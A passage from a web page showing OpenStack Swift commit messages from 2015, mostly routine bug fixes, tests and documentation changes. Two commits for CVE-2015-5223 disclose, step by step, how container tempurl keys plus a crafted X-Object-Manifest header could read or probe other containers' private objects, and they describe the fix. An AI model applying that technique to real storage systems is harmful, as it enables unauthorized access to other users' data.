<p>&nbsp;&nbsp;&nbsp;&nbsp;Test if container_sweep is executed on unmounted devices</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change ensures that container_sweep is not run if a device is not mounted<br />
&nbsp;&nbsp;&nbsp;&nbsp;and mount_check is set to True.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I823083c8431d9e<wbr />61fd426508033ec<wbr />9188503957b</p>
<p>commit e02609c66a80484<wbr />5672413b06830b8<wbr />7395afef31<br />
Author: Samuel Merritt &lt;email address hidden&gt;<br />
Date:   Tue Sep 1 15:19:50 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Preserve traceback in swift-dispersio<wbr />n-report</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Commit c690bcb fixed a bug in the dispersion report, but changed this<br />
&nbsp;&nbsp;&nbsp;&nbsp;from a bare &quot;raise&quot; to &quot;raise err&quot;, which loses the traceback. Not a<br />
&nbsp;&nbsp;&nbsp;&nbsp;big deal, but worth putting back IMO.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Id5b72153a4b8df<wbr />8e3faaf1fa3fb20<wbr />40e28ba85cc</p>
<p>commit d06d4ad0fd2dfe6<wbr />9da8008e7296512<wbr />64522c6c06<br />
Author: Minwoo Bae &lt;email address hidden&gt;<br />
Date:   Tue Sep 1 15:08:44 2015 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Included reference in swift.obj.diskfile to enumerate the string<br />
&nbsp;&nbsp;&nbsp;&nbsp;used for data file paths.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ie22caa678bc00d<wbr />fc43fabec7efbbb<wbr />9f34490f1b5</p>
<p>commit 615c7a204b9386e<wbr />05c5bab658bfe96<wbr />766ad1e680<br />
Author: Brian Cline &lt;email address hidden&gt;<br />
Date:   Tue Sep 1 10:51:20 2015 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Adds useful dispersion info from changelog</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I1a45088fc32620<wbr />b02ff9a754b02ec<wbr />1eb75a59d6e</p>
<p>commit 3b8755098a1786c<wbr />5447abf158bd686<wbr />293a82977c<br />
Author: janonymous &lt;email address hidden&gt;<br />
Date:   Sun Aug 2 21:29:13 2015 +0530</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Replace a / b with a // b to use integer division where needed</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I72c81faa62786e<wbr />140b0de00e3a049<wbr />34bf1b5adbd</p>
<p>commit 524c89b7eeff037<wbr />b8a6b421888771e<wbr />15f98c2da2<br />
Author: John Dickinson &lt;email address hidden&gt;<br />
Date:   Fri Aug 21 13:39:41 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ic6301146b839c9<wbr />921bb85c4f4c1e5<wbr />85c9ab66661</p>
<p>commit 05de1305a903ee4<wbr />ce9c8c50fde53c5<wbr />52d5b90d51<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Thu Aug 27 18:35:09 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Make ssync_sender send valid chunked requests</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;The connect method of ssync_sender tells the remote connection that it&#x27;s<br />
&nbsp;&nbsp;&nbsp;&nbsp;going to send a valid HTTP chunked request, but if the remote end needs<br />
&nbsp;&nbsp;&nbsp;&nbsp;to respond with an error of any kind sender th...</p></div>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/221410
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527
Submitter: Jenkins
Branch:    feature/hummingbird

commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot &lt;openstack-infra@lists.openstack.org&gt;
Date:   Sat Sep 5 06:17:51 2015 +0000

    Imported Translations from Transifex
    
    For more information about this automatic import see:
    https://wiki.openstack.org/wiki/Translations/Infrastructure
    
    Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6

commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer &lt;speer.emett@gmail.com&gt;
Date:   Wed Sep 2 17:18:03 2015 -0700

    [Labs] Update links to Cloud Admin Guide
    
    Update links to the Cloud Admin Guide after the
    RST conversion of that book altered URLs.
    
    Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b

commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede &lt;cschwede@redhat.com&gt;
Date:   Wed Sep 2 10:52:34 2015 +0000

    Test if container_sweep is executed on unmounted devices
    
    This change ensures that container_sweep is not run if a device is not mounted
    and mount_check is set to True.
    
    Change-Id: I823083c8431d9e61fd426508033ec9188503957b

commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Tue Sep 1 15:19:50 2015 -0700

    Preserve traceback in swift-dispersion-report
    
    Commit c690bcb fixed a bug in the dispersion report, but changed this
    from a bare "raise" to "raise err", which loses the traceback. Not a
    big deal, but worth putting back IMO.
    
    Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae &lt;minwoob@us.ibm.com&gt;
Date:   Tue Sep 1 15:08:44 2015 -0500

    Included reference in swift.obj.diskfile to enumerate the string
    used for data file paths.
    
    Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline &lt;bcline@softlayer.com&gt;
Date:   Tue Sep 1 10:51:20 2015 -0500

    Adds useful dispersion info from changelog
    
    Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e

commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sun Aug 2 21:29:13 2015 +0530

    Replace a / b with a // b to use integer division where needed
    
    Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd

commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson &lt;me@not.mn&gt;
Date:   Fri Aug 21 13:39:41 2015 -0700

    Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
    
    Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Aug 27 18:35:09 2015 -0700

    Make ssync_sender send valid chunked requests
    
    The connect method of ssync_sender tells the remote connection that it's
    going to send a valid HTTP chunked request, but if the remote end needs
    to respond with an error of any kind sender throws HTTP right out the
    window, picks up his ball, and closes the socket down hard - much to the
    surprise of the eventlet.wsgi server who up to this point had been
    playing along quite nicely with this 'SSYNC' nonsense assuming that
    everyone here is consenting mature adults.
    
    If you're going to make a "Transfer-Encoding: chunked" request have the
    good decency to finish the job with a proper '0\r\n\r\n'. [1]
    
    N.B. It might be possible to handle an error status during the
    initialize_request phase with some sort of 100-continue support, but
    honestly it's not entirely clear to me when the server isn't going to
    close the connection if the client is still expected to send the body
    [2] - further if the error comes later during missing_check or updates
    we'll for sure want to send the chunk transfer termination line before
    we close down the socket and this way we cover both.
    
    1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
    2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
    3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
    
    Closes-Bug #1489587
    Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf

commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa &lt;nakagawamsa@nttdata.co.jp&gt;
Date:   Fri Aug 28 11:49:43 2015 +0900

    Remove duplicate X-Backend-Storage-Policy-Index key
    
    There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test_server.py.
    One key has fixed policy index value, and another has random value.
    Unittest should done with random policy index, so remove key which is set fixed value.
    
    Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3

commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse &lt;paul.e.luse@intel.com&gt;
Date:   Wed Aug 12 13:32:50 2015 -0700

    EC GET path: require fragments to be of same set
    
    And if they are not, exhaust the node iter to go get more.  The
    problem without this implementation is a simple overwrite where
    a GET follows before the handoff has put the newer obj back on
    the 'alive again' node such that the proxy gets n-1 fragments
    of the newest set and 1 of the older.
    
    This patch bucketizes the fragments by etag and if it doesn't
    have enough continues to exhaust the node iterator until it
    has a large enough matching set.
    
    Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    Co-Authored-By: Alistair Coles &lt;alistair.coles@hp.com&gt;
    Closes-Bug: 1457691

commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Wed Aug 26 16:30:23 2015 +0100

    Add test that a tempurl POST cannot set a DLO manifest header
    
    Follow up to [1] to add tests for tempurl POSTs not being allowed
    to set a DLO manifest header.
    
    [1] I11e68830009d3f6bff44ae4011a41b67139146f6
    
    Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
    Related-Bug: 1453948

commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Tue Aug 11 09:10:13 2015 -0500

    Better scoping for tempurls, especially container tempurls
    
    It used to be that a GET of a tempurl referencing a large object would
    let you download that large object regardless of where its segments
    lived. However, this led to some violated user expectations around
    container tempurls.
    
    (Note on shorthand: all tempurls reference objects. However, "account
    tempurl" and "container tempurl" are shorthand meaning tempurls
    generated using a key on the account or container, respectively.)
    
    Let's say an application is given tempurl keys to a particular
    container, and it does all its work therein using those keys. The user
    expects that, if the application is compromised, then the attacker
    only gains access to the "compromised-container". However, with the old
    behavior, the attacker could read data from *any* container like so:
    
    1) Choose a "victim-container" to download
    
    2) Create PUT and GET tempurl for any object name within the
       "compromised-container". The object doesn't need to exist;
       we'll create it.
    
    3) Using the PUT tempurl, upload a DLO manifest with
       "X-Object-Manifest: /victim-container/"
    
    4) Using the GET tempurl, download the object created in step 3. The
       result will be the concatenation of all objects in the
       "victim-container".
    
    Step 3 need not be for all objects in the "victim-container"; for
    example, a value "X-Object-Manifest: /victim-container/abc" would only
    be the concatenation of all objects whose names begin with "abc". By
    probing for object names in this way, individual objects may be found
    and extracted.
    
    A similar bug would exist for manifests referencing other accounts
    except that neither the X-Object-Manifest (DLO) nor the JSON manifest
    document (SLO) have a way of specifying a different account.
    
    This change makes it so that a container tempurl only grants access to
    objects within its container, *including* large-object segments. This
    breaks backward compatibility for container tempurls that may have
    pointed to cross container *LO's, but (a) there are security
    implications, and (b) container tempurls are a relatively new feature.
    
    This works by having the tempurl middleware install an authorization
    callback ('swift.authorize' in the WSGI environment) that limits the
    scope of any requests to the account or container from which the key
    came.
    
    This requires swift.authorize to persist for both the manifest request
    and all segment requests; this is done by having the proxy server
    restore it to the WSGI environment prior to returning from __call__.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Clay Gerrard &lt;clayg@swiftstack.com&gt;
    Co-Authored-By: Alistair Coles &lt;alistair.coles@hp.com&gt;
    Co-Authored-By: Christian Schwede &lt;cschwede@redhat.com&gt;
    Co-Authored-By: Matthew Oliver &lt;matt@oliver.net.au&gt;
    
    Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
    Closes-Bug: 1449212

commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 23 22:36:21 2015 -0700

    Disallow unsafe tempurl operations to point to unauthorized data
    
    Do not allow PUT tempurls to create pointers to other data. Specifically
    disallow the creation of DLO object manifests by returning an error if a
    non-safe tempurl request includes an X-Object-Manifest header regardless of
    the value of the header.
    
    This prevents discoverability attacks which can use any PUT tempurl to probe
    for private data by creating a DLO object manifest and then using the PUT
    tempurl to head the object which would 404 if the prefix does not match any
    object data or form a valid DLO HEAD response if it does.
    
    This also prevents a tricky and potentially unexpected consequence of PUT
    tempurls which would make it unsafe to allow a user to download objects
    created by tempurl (even if they just created them) because the result of
    reading the object created via tempurl may not be the data which was uploaded.
    
    [CVE-2015-5223]
    
    Co-Authored-By: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
    
    Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
    Closes-Bug: 1453948

commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA &lt;miyahara.kazuhiro@lab.ntt.co.jp&gt;
Date:   Mon Aug 17 16:50:56 2015 +0900

    Fix dispersion-reports error message
    
    This patch fixes Swift to show message
    "No objects to query. Has swift-dispersion-populate been run?"
    for "swift-dispersion-report —object-only”
    with no container for object dispersion.
    
    Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
    Closes-Bug: #1468120

commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad &lt;tushar.gohad@intel.com&gt;
Date:   Tue Aug 18 07:24:19 2015 +0000

    Restrict PyECLib version to 1.0.7
    
    v1.0.9 rev of PyECLib replaces Jerasure with a native EC
    implementation (liberasurecode_rs_vand) as the default
    EC scheme.  Going forward, Jerasure will not be bundled
    with PyPI version of PyECLib as it used to be, until
    v1.0.7.
    
    This is an interim change to Swift requirements until we
    get v1.0.9 PyECLib included into global-requirements and
    ready patches that change Swift default ec_type (for doc,
    config samples and unit tests) from "jerasure_rs_vand"
    to "liberasurecode_rs_vand."
    
    Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4

commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Mon Jul 6 13:21:40 2015 -0700

    Fix EC GET backend stream iteration state
    
    In EC case, When GET object requested, proxy-server always makes a log
    line "Client disconnected on read" even though the request succeeded.
    
    That is because ECAppIter class doesn't maintain a bunch of backend
    stream when closing the app_iter. It will cause unfortunately
    GeneratorExit on backend stream ResumingGetter.
    
    This patch fixes to set non_client_disconnected to propagate the state
    to the backend streams when the range iteration stopped successful.
    
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    
    Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
    Closes-Bug: #1472201

commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Tue Aug 25 11:05:41 2015 +0100

    Fix swob.Range docstring
    
    Bad ranges cause a ValueError to be raised, not an empty
    ranges list.
    
    Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed

commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Mon Aug 24 23:11:34 2015 -0700

    Allow pep8 of a single file
    
    Now you can run
    
       $ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
    
    to run pep8 against just those files[1]. This is quite a bit faster
    than a full pep8 run, and the faster feedback is nice when you're
    fiddling with some formatting to placate pep8.
    
    Of course, you can still run "tox -e pep8" to check the whole source
    tree, just as before this commit.
    
    [1] It'll still run against bin/swift* as well, but that's still a lot
    faster than running against all our .py files.
    
    Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502

commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver &lt;matt@oliver.net.au&gt;
Date:   Tue Aug 25 11:24:49 2015 +1000

    Follow up patch to fix a multiline import NITPIC
    
    This change cleans up test/unit/obj/test_replicator.py's imports
    to use only 1 version of multiline import syntaxes (' \' vs '()').
    I don't really mind which, but we should be consistant, at least
    in the same file.
    
    This is a follow up for patch 215857.
    
    Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5

commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai &lt;osanai.hisashi@jp.fujitsu.com&gt;
Date:   Tue Aug 25 07:52:18 2015 +0900

    Fix typo of a comment in replicator
    
    The typo was introduced by patch 138342 (sorry) so I fix it.
    
    Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e

commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke &lt;tim.burke@gmail.com&gt;
Date:   Mon Aug 24 20:36:22 2015 +0000

    Fix use of delimiter in account listings
    
    Previously, account listings that used the delimiter query param could
    omit some containers if they ended with the character that follows the
    delimiter.
    
    See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
    for container listings.
    
    Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e

commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Fri Aug 21 18:14:55 2015 -0700

    Use correct Storage-Policy header for REPLICATE requests
    
    Under some concurrency the object-replicator could potentially send the
    wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
    replication if there were multiple storage policies on the same node
    because of a race where multiple jobs being processed concurrently would
    mutate some shared state on the ObjectReplicator instance.
    
    Instead of using shared stated on the ObjectReplicator instance when
    mutating the default headers send with REPLICATION requests each job
    will copy them into a local where they can safely be updated.
    
    Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd

commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Fri May 15 06:44:12 2015 -0700

    eventlet.posthook related code needn't anymore
    
    In the past, older Swift seemed to use eventlet.posthooks scheme for the
    logging on proxy with posthooklogger method. However, for now, Swift
    attaches no method to eventlet.posthooks everywhere so we don't have
    to maintain the posthooks anymore.
    
    Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c

commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Wed May 13 00:43:59 2015 -0700

    Fix the missing SLO state on fast-post
    
    When using fast-post and POST (i.e. metadata update) is requested to
    a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
    header from the existing metadata. It results in breaking the SLO
    state because the manifest missing the 'X-Static-Large-Object' metadata
    will be maintained as a normal files.
    
    This patch fixes object-server to keep the existing
    'X-Static-Large-Object' flag and then keep the SLO state.
    
    Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
    Closes-bug: #1453807

commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom &lt;eranr@il.ibm.com&gt;
Date:   Tue Jul 28 09:41:12 2015 +0300

    Add container sync probe test to SAIO default set
    
    SAIO Configuration and documentation changes enabling to run the
    container sync probe test by default
    
    Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
    Related-Bug: #1476623

commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Fri Aug 21 14:04:46 2015 -0700

    Minor cleanup handoff mode warnings
    
      * message is a little clearer
      * test is a little stronger
    
    Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e

commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna &lt;ccavanna@ca.ibm.com&gt;
Date:   Fri Aug 21 14:14:31 2015 -0400

    New troubleshooting case in documentation.
    
    Added a new troubleshooting case for the "First Contribution to Swift"
    documentation page.
    
    Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0

commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh &lt;pradeep.singh@nectechnologies.in&gt;
Date:   Tue Jul 14 10:03:18 2015 +0530

    Emit warning log in object replicator
    
    When the object-replicator encounters handoffs_first and
    handoff_delete options as enabled it should emit a log
    warning indicating that it should be changed back to the
    default before the next "normal" rebalance.
    
    Closes-Bug: #1457262
    
    Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0

commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Thu Aug 20 13:24:38 2015 -0700

    Fix 500 for bogus Range request to 0-byte object.
    
    The proxy was trying to pop a byterange off a Range header that didn't
    contain syntactically-valid byteranges. This worked about as well as
    you'd expect. Now we detect the bogus value and remove the header
    entirely.
    
    Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810

commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai &lt;takaiak@nttdata.co.jp&gt;
Date:   Thu Aug 20 18:40:52 2015 +0900

    Fix the comment in [1].
    
    (line 259) parameter(op) of object_update method is 'PUT' or
    'DELETE' not 'POST' or 'DELETE'.
    
    [1]: swift/obj/updater.py
    
    Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160

commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 28 20:35:25 2015 +0530

    test/(functional/probe):Replace python print operator with print function (pep H233, py33)
    
    'print' function is compatible with 2.x and 3.x python versions
    Link : https://www.python.org/dev/peps/pep-3105/
    
    Python 2.6 has a __future__ import that removes print as language syntax,
    letting you use the functional form instead
    
    Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58

commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Wed Aug 19 10:42:28 2015 -0700

    Add OpenStack release names to changelog
    
    I can never remember the mapping of real version numbers to the
    OpenStack names.
    
    Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab

commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Sun Aug 16 11:18:49 2015 +0200

    pep8: Don't override '_' symbol
    
    Fix pep8 warning F402 "import '_' from line 51 shadowed by loop
    variable".
    
    Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5

commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Sun Aug 16 11:06:52 2015 +0200

    pep8: Fix usage of the l10n _('...') function
    
    Fix the pep8 warning H702 "Formatting operation should be outside of
    localization method call".
    
    For the logger, pass parameters as indexed parameters instead of using
    the string str%args operator, the logger is more reliable in case of
    formatting error.
    
    Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55

commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Sun Aug 16 10:34:26 2015 +0200

    pep8: replace deprecated calls to assert_()
    
    The TestCase.assert_() has been deprecated in Python 2.7. Replace it
    with assertTrue() or even better methods (assertIn, assertNotIn,
    assertIsInstance) which provide better error messages.
    
    Change-Id: I21c730351470031a2dabe5238693095eabdb8964

commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Mon Jul 27 18:55:01 2015 +0200

    pep8: Fix hacking H232 warnings (octal)
    
    Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
    written as 0o1234".
    
    Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616

commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Fri Aug 7 16:24:28 2015 -0500

    Add unit test for container_update for unmounted device
    
    This unit test case gains coverage for container/update.py
    where a device (i.e. sda1) is not mounted and the code
    responds with a warning logger that the device is not
    mounted and continues.  Coverage increases 2% as a result.
    
    Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54

commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini &lt;ccontini@cloudops.com&gt;
Date:   Wed Aug 12 15:00:45 2015 -0400

    Keep user id and project id in subrequests env
    
    Keep HTTP_X_USER_ID and HTTP_X_PROJECT_ID to be available as
    user_id and project_id in storage.objects.outgoing.bytes in
    ceilometer when downloading a multipart object.
    
    Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
    Closes-Bug: #1477283

commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson &lt;me@not.mn&gt;
Date:   Mon Aug 17 22:13:42 2015 -0700

    move global statement up a few lines
    
    Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb

commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani &lt;roumani@ca.ibm.com&gt;
Date:   Mon Aug 3 17:45:56 2015 -0400

    Doc instructions for post rebase steps
    
    Improve the 'first_contribution_swift' by adding instructions for how to
    rebuild swift following a rebase.
    
    Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15

commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai &lt;osanai.hisashi@jp.fujitsu.com&gt;
Date:   Wed Dec 3 06:15:16 2014 +0900

    Enable Object Replicator's failure count in recon
    
    This patch makes the count of object replication failure in recon.
    And "failure_nodes" is added to Account Replicator and
    Container Replicator.
    
    Recon shows the count of object repliction failure as follows:
    $ curl http://&lt;ip&gt;:&lt;port&gt;/recon/replication/object
    {
        "replication_last": 1416334368.60865,
        "replication_stats": {
            "attempted": 13346,
            "failure": 870,
    	"failure_nodes": {
                "192.168.0.1": {"sdb1": 3},
                "192.168.0.2": {"sdb1": 851,
                                "sdc1": 1,
                                "sdd1": 8},
                "192.168.0.3": {"sdb1": 3,
                                "sdc1": 4}
    	},
            "hashmatch": 0,
            "remove": 0,
            "rsync": 0,
            "start": 1416354240.9761429,
            "success": 1908
        },
        "replication_time": 2316.5563162644703,
        "object_replication_last": 1416334368.60865,
        "object_replication_time": 2316.5563162644703
    }
    
    Note that 'object_replication_last' and 'object_replication_time' are
    considered to be transitional and will be removed in the subsequent
    releases. Use 'replication_last' and 'replication_time' instead.
    
    Additionaly this patch adds the count in swift-recon and it will be
    showed as follows:
    $ swift-recon object -r
    ========================================================================
    =======
    --&gt; Starting reconnaissance on 4 hosts
    ========================================================================
    =======
    [2014-11-27 16:14:09] Checking on replication
    [replication_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
    no_result: 0, reported: 4
    [replication_success] low: 3, high: 3, avg: 3.0, total: 12,
    Failed: 0.0%, no_result: 0, reported: 4
    [replication_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
    no_result: 0, reported: 4
    [replication_attempted] low: 1, high: 1, avg: 1.0, total: 4,
    Failed: 0.0%, no_result: 0, reported: 4
    Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
    192.168.0.4:6002.
    Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
    192.168.0.1:6002.
    ========================================================================
    =======
    
    In case there is a cluster which has servers, a server runs with this
    patch and the other servers run without this patch. If swift-recon
    executes on the server which runs with this patch, there are unnecessary
    information on the output such as [failure], [success] and [attempted].
    Because other servers which run without this patch are not able to
    send a response with information that this patch needs.
    Therefore once you apply this patch, you also apply this patch to other
    servers before you execute swift-recon.
    
    DocImpact
    Change-Id: Iecd33655ae2568482833131f422679996c374d78
    Co-Authored-By: Kenichiro Matsuda &lt;matsuda_kenichi@jp.fujitsu.com&gt;
    Co-Authored-By: Brian Cline &lt;bcline@softlayer.com&gt;
    Implements: blueprint enable-object-replication-failure-in-recon

commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede &lt;cschwede@redhat.com&gt;
Date:   Thu Aug 6 07:21:15 2015 +0000

    Make swift-ring-builder filename usage more consistent
    
    Sometimes the given argument is internally altered and another filename is used
    without a note to the operator. Even worse, a given .ring.gz filename is
    sometimes written out as builder file, without updating the corresponding
    .builder file.
    
    There is already a method to parse the given argv and return the name of the
    builder and ring file. However, it's rarely used and no warning is given to the
    user if it is altered. This patch uses the already parsed builder and ring file
    name instead of argv[1], and also adds a note to the user if the used filename
    is differently to the one given as argument.
    
    Closes-Bug: 1482096
    Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2

commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Mon Aug 17 13:54:44 2015 -0500

    Quorum on durable response is too low
    
    Increase the .durable quorum from 2 to "parity + 1" to guarantee
    that we will never fail to rebuild an object.  Otherwise, with
    low durable responses back (&lt; parity + 1), the putter objects
    return with failed attribute set to true, thereby failing the
    rebuild of fragments for an object.
    
    Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
    Closes-Bug: 1484565

commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang &lt;zakir.exe@gmail.com&gt;
Date:   Fri Aug 14 16:46:35 2015 -0700

    Fix some minor typos
    
    Fixed some typos in function name and comments.
    
    Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2

commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Wed Jul 22 10:39:22 2015 -0700

    Fix EC range GET/COPY handling
    
